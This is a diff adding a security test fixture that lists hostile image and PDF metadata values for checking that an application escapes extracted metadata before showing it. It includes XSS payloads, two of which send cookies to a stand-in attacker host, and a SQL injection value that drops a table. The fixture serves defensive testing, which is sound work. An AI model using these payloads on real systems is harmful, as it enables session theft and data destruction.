@@ -1,0 +1,15 @@
+INERT FIXTURE — read as raw text only
+Purpose: documents EXIF / PDF metadata field values containing HTML/JS payloads.
+Threat: if metadata fields extracted from uploaded images or PDFs are rendered into HTML
+without escaping, the payload executes as a script.
+
+Malicious EXIF / metadata values (to embed in test images using exiftool or similar):
+
+  Artist:    <script>alert(document.cookie)</script>
+  Comment:   "><img src=x onerror=fetch('https://attacker.example/?c='+document.cookie)>
+  Copyright: <svg onload=alert(1)>
+  Title:     '; DROP TABLE media; --
+  Author:    \"><script>document.location='https://attacker.example/?c='+document.cookie</script>
+
+When testing, assert that displaying extracted metadata in the UI produces literal text
+(HTML-encoded) and does not execute any script or event handler.
